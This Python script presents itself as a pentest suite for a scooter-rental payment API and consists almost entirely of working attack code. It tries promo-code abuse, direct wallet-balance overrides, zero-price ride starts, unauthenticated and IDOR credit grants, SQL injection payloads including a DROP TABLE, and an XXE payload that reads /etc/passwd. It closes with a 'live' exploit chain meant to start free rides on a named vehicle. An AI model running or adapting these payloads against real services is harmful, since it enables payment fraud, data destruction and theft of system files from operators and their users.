#!/usr/bin/env python3
"""
Scooter Payment Bypass Pentest Suite
Tests: Promo Abuse | Wallet Manipulation | Pricing Bypass | Auth Override
For authorized security testing ONLY
"""

import requests
import json
import time
import random
import base64
from urllib.parse import urljoin

class PaymentBypassTester:
    def __init__(self, target_base, session_token=None):
        self.base = target_base.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.token = session_token
        self.vulnerabilities = []
    
    def headers(self):
        h = {'Content-Type': 'application/json', 'User-Agent': 'ScooterApp/2.12.0'}
        if self.token:
            h['Authorization'] = f'Bearer {self.token}'
        return h
    
    def test_promo_abuse(self):
        """Promo code enumeration + infinite redeem"""
        print("\n[1/7] PROMO CODE ABUSE")
        promos = [
            'WELCOME50', 'FREERIDE', 'TESTCREDIT', 'DEMO2024',
            'BYPASS100', 'HACKME', 'NULLPAY', 'FREE999',
            "' OR 1=1--", 'admin', '; DROP TABLE', '1=1'
        ]
        
        vuln = False
        for promo in promos:
            data = {'promo_code': promo, 'amount': 999}
            r = self.session.post(f"{self.base}/payment/credits/add", json=data, headers=self.headers())
            
            if r.status_code in [200, 201]:
                print(f"✅ VULN: {promo} → {r.json()}")
                vuln = True
            elif 'invalid' not in r.text.lower():
                print(f"⚠️  {promo}: {r.status_code}")
        
        if vuln:
            self.vulnerabilities.append("PromoCodeAbuse")
    
    def test_wallet_manipulation(self):
        """Direct wallet balance override"""
        print("\n[2/7] WALLET MANIPULATION")
        payloads = [
            {'credits': 999.99, 'source': 'promo'},
            {'balance': 1000, 'override': True},
            {'amount': -50, 'type': 'refund'},
            {'wallet': {'balance': 5000}},
            {'set_balance': 9999}
        ]
        
        for i, payload in enumerate(payloads, 1):
            r = self.session.post(f"{self.base}/wallet/credit", json=payload, headers=self.headers())
            if r.status_code not in [400, 401, 403, 404]:
                print(f"✅ WALLET VULN {i}: {r.status_code} → {payload}")
    
    def test_pricing_bypass(self):
        """Ride pricing manipulation"""
        print("\n[3/7] PRICING BYPASS")
        ride_payloads = [
            {'vehicle_id': 'test', 'price_per_min': 0, 'base_price': 0},
            {'cost': 0, 'unlock_fee': 0},
            {'pricing': {'minute': 0, 'unlock': 0}},
            {'payment_required': False}
        ]
        
        for payload in ride_payloads:
            r = self.session.post(f"{self.base}/rides/start", json=payload, headers=self.headers())
            if r.status_code == 200 or 'success' in r.text.lower():
                print(f"✅ PRICING BYPASS: {payload}")
    
    def test_auth_bypass(self):
        """Payment without auth"""
        print("\n[4/7] AUTH BYPASS")
        h = {'Content-Type': 'application/json'}  # NO AUTH
        
        r = self.session.post(f"{self.base}/wallet/credit", 
                             json={'credits': 100}, headers=h)
        if r.status_code not in [401, 403]:
            print(f"✅ NO-AUTH WALLET: {r.status_code}")
    
    def test_idor_payment(self):
        """Insecure Direct Object Reference"""
        print("\n[5/7] IDOR PAYMENT")
        for user_id in ['1', 'admin', '0', 'null']:
            data = {'user_id': user_id, 'credits': 500}
            r = self.session.post(f"{self.base}/wallet/credit", json=data, headers=self.headers())
            if r.status_code == 200:
                print(f"✅ IDOR VULN: user_id={user_id}")
    
    def test_sql_injection_payment(self):
        """SQLi in payment fields"""
        print("\n[6/7] SQL INJECTION")
        sqli = ["' OR 1=1--", "'; DROP TABLE wallets;--", "' UNION SELECT balance FROM wallets--"]
        
        for payload in sqli:
            data = {'promo_code': payload}
            r = self.session.post(f"{self.base}/payment/credits/add", json=data, headers=self.headers())
            if len(r.text) > 1000 or 'error' in r.text.lower():
                print(f"✅ SQLi DETECTED: {payload[:30]}")
    
    def test_xxe_payment(self):
        """XXE in payment XML endpoints"""
        print("\n[7/7] XXE WALLET")
        xxe = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<payment><code>&xxe;</code></payment>'''
        
        r = self.session.post(f"{self.base}/payment/verify", 
                             data=xxe, headers={'Content-Type': 'application/xml'})
        if 'root:' in r.text:
            print("✅ CRITICAL XXE VULN")
    
    def run_full_suite(self):
        """Execute complete pentest"""
        print(f"🎯 PAYMENT BYPASS PENTEST")
        print(f"Target: {self.base}")
        
        tests = [
            self.test_promo_abuse,
            self.test_wallet_manipulation, 
            self.test_pricing_bypass,
            self.test_auth_bypass,
            self.test_idor_payment,
            self.test_sql_injection_payment,
            self.test_xxe_payment
        ]
        
        for test in tests:
            test()
            time.sleep(1)
        
        print(f"\n📋 VULNERABILITIES: {len(self.vulnerabilities)}")
        for vuln in self.vulnerabilities:
            print(f"  - {vuln}")
    
    def exploit_chain(self, vehicle_id):
        """Production exploit chain"""
        print("\n🔗 EXPLOIT CHAIN")
        
        # 1. Promo abuse
        self.test_promo_abuse()
        
        # 2. Pricing override
        ride_data = {
            'vehicle_id': vehicle_id,
            'price_per_min': 0,
            'unlock_fee': 0,
            'payment_method': 'none'
        }
        r = self.session.post(f"{self.base}/rides/start", json=ride_data, headers=self.headers())
        print(f"Ride start: {r.status_code}")

# USAGE FOR PENTEST
if __name__ == "__main__":
    target = input("Target API base (e.g. https://api.target.com/v1): ")
    token = input("Session token (optional): ") or None
    
    tester = PaymentBypassTester(target, token)
    tester.run_full_suite()
    
    # Live exploit
    vehicle = input("Vehicle ID for ride exploit: ")
    tester.exploit_chain(vehicle)
